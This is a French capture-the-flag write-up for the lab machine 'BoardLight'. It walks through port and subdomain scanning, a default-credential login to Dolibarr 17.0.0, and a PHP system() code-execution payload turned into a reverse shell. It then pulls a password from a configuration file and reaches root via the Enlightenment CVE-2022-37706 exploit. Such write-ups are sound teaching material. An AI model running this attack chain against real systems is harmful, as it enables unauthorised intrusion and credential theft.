  # BoardLight

	echo "10.10.11.11 board.htb" >> /etc/hosts
    echo "10.10.11.11 crm.board.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.11 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.11 -oN nmap.txt
	feroxbuster --silent -u http://board.htb
	ffuf -H "Host: FUZZ.board.htb" -u http://board.htb -w ./Wordlists/n0kovo_subdomains_huge.txt -fs 15949

    
Scans classiques. Bien faire le fuzzing sur "board.htb" qui est trouvé grâce à l'adresse de contact.

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

Sous-domaine trouvé : 

> crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 62ms]::

http://crm.board.htb/ => Page de login Dolibarr 17.0.0

Credentials par défaut : admin/admin

Une exécution de code est possible une fois authentifié. Voir : https://www.swascan.com/security-advisory-dolibarr-17-0-0/

Payload : 

    <?PHP echo system(“whoami”).”<br><br>”.system(“pwd”).”<br><br>”.system(“ip a”);?>
    
Remplacer le "pwd" par un reverse-shell et réceptionner la connexion : 

    nc -nvlp 9999
    ...
    whoami
    
On reçoit un shell en tant que www-data.

Mot de passe dans un fichier de configuration : 

    cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
    
Le mot de passe fonctionne pour l'utilisateur "larissa" qui avait un dossier dans /home/ : 
    
    ssh larissa@10.10.11.11
    cat user.txt 

## Élévation de privilèges

find / -perm /4000 2>/dev/null

Quelques résultats inhabituels : 

    /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
    /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
    /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
    /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset

Voir : https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit

    cd /tmp
    vi exp.sh
    chmod +x exp.sh
    ./exp.sh
    ...
    whoami
    cat /root/root.txt
